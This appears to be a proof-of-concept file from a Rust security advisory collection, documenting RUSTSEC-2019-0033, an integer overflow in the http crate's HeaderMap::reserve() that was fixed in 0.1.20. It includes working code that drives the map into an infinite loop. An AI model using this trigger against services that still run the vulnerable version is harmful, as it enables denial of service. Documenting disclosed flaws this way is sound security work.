/*!
```crux-poc
[target]
crate = "http"
version = "0.1.19"

[test]
analyzers = ["manual"]
# cargo_flags = ["--release"]

[report]
title = "Integer Overflow in HeaderMap::reserve() can cause Denial of Service"
description = """
`HeaderMap::reserve()` used `usize::next_power_of_two()` to calculate the increased capacity.
However, `next_power_of_two()` silently overflows to 0 if given a sufficiently large number in release mode.

If the map was not empty when the overflow happens,
the library will invoke `self.grow(0)` and start infinite probing.
This allows an attacker who controls the argument to `reserve()`
to cause a potential denial of service (DoS).

The flaw was corrected in 0.1.20 release of `http` crate."""
code_snippets = ["https://github.com/hyperium/http/blob/9c05e391e00474abaa8c14a86bcb0fc5eff1120e/src/header/map.rs#L622-L640"]
patched = [">= 0.1.20"]
issue_url = "https://github.com/hyperium/http/issues/352"
issue_date = 2019-11-16
rustsec_url = "https://github.com/RustSec/advisory-db/pull/217"
rustsec_id = "RUSTSEC-2019-0033"
```
!*/
#![forbid(unsafe_code)]

use http::header::{HeaderMap, HOST};

fn main() {
    let mut map = HeaderMap::<u32>::with_capacity(32);
    dbg!(map.capacity());
    // map size becomes larger than MAX_SIZE
    map.reserve(50000);
    dbg!(map.capacity());
    // debug mode: panics with integer overflow
    // release mode: the map size silently overflows to 0
    map.reserve(std::usize::MAX - 100000);

    map.insert("host", 42);
    // this calls grow(0), which causes infinite loop
    map.reserve(std::usize::MAX - 100000);
}
